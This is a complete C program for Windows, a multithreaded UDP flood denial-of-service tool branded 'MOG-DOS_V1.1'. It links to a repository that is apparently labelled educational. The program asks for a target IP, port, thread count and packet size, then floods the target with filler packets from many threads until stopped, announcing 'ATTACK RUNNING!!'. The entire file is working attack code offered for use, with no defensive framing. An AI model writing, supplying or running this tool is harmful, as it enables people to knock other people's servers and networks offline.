#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 80
#define DEFAULT_THREADS 10
#define DEFAULT_BYTES 1024

volatile int running = 1;

DWORD WINAPI flood(LPVOID param) {
    SOCKET sock;
    struct sockaddr_in server;
    char *target_ip = ((char **)param)[0];
    int target_port = atoi(((char **)param)[1]);
    int bytes_to_send = atoi(((char **)param)[2]);
    char *packet = malloc(bytes_to_send);
    
    if (packet == NULL) return 1;
    
    memset(packet, 'X', bytes_to_send);
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) {
        free(packet);
        return 1;
    }
    
    server.sin_addr.s_addr = inet_addr(target_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    
    while (running) {
        sendto(sock, packet, bytes_to_send, 0, (struct sockaddr *)&server, sizeof(server));
    }
    
    closesocket(sock);
    free(packet);
    return 0;
}

int main() {
    WSADATA wsa;
    char target_ip[16];
    char target_port[6];
    char thread_count[10];
    char byte_count[10];
    int threads, i;
    HANDLE *thread_handles;
    
    printf("MOG-DOS_V1.1: https://github.com/MOG-Developing/DOS-ATTACK-educational/tree/new\n\n");
    
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }
    
    printf("Enter target IP: ");
    fgets(target_ip, sizeof(target_ip), stdin);
    target_ip[strcspn(target_ip, "\n")] = 0;
    
    printf("Enter target port: ");
    fgets(target_port, sizeof(target_port), stdin);
    target_port[strcspn(target_port, "\n")] = 0;
    
    printf("Enter thread count: ");
    fgets(thread_count, sizeof(thread_count), stdin);
    thread_count[strcspn(thread_count, "\n")] = 0;
    threads = atoi(thread_count);
    if (threads <= 0) threads = DEFAULT_THREADS;
    
    printf("Enter bytes to send per packet: ");
    fgets(byte_count, sizeof(byte_count), stdin);
    byte_count[strcspn(byte_count, "\n")] = 0;
    int bytes = atoi(byte_count);
    if (bytes <= 0) bytes = DEFAULT_BYTES;
    
    char *params[3];
    params[0] = target_ip;
    params[1] = target_port;
    params[2] = byte_count;
    
    thread_handles = malloc(threads * sizeof(HANDLE));
    
    printf("\nStarting attack with %d threads (%d bytes/packet)...\n", threads, bytes);
    
    for (i = 0; i < threads; i++) {
        thread_handles[i] = CreateThread(NULL, 0, flood, params, 0, NULL);
    }
    
    printf("\n ATTACK RUNNING!! \n");
    printf("Press Enter to stop...\n");
    
    getchar();
    running = 0;
    
    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);
    
    for (i = 0; i < threads; i++) {
        CloseHandle(thread_handles[i]);
    }
    
    free(thread_handles);
    WSACleanup();
    
    printf("\nAttack stopped.\n");
    return 0;
}